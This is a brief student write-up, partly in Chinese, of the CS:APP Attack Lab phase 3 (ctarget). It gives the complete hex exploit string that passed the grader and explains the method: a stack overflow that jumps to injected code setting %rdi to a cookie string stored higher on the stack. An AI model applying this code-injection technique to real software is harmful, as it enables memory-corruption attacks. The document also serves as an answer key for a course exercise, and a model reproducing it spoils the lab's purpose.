## attachlab ctarget q3

```
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                      00 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
[Inferior 1 (process 1577) exited normally]

```

这个任务是传递一个字符串使得等于cookie，还是按照之前的做饭，先通过stackoverflow，将返回值覆盖成一个栈上的位置，然后在这个栈上的位置执行movq addr, $rdi

这个addr就是存访cookie的位置，但是需要自己手动构造一个cookie的值，然后把地址赋值给rdi，这个地址其实就是栈上某个位置，对应于我的解答中的35 39 62 这部分，这部分不能放置在高地址的部分(比如直接跟在55 c3 后)，因为rsp会通过一些其他函数操作覆盖，所以我开了更多的溢出区，把他放到了不会被其他程序覆盖的地方。
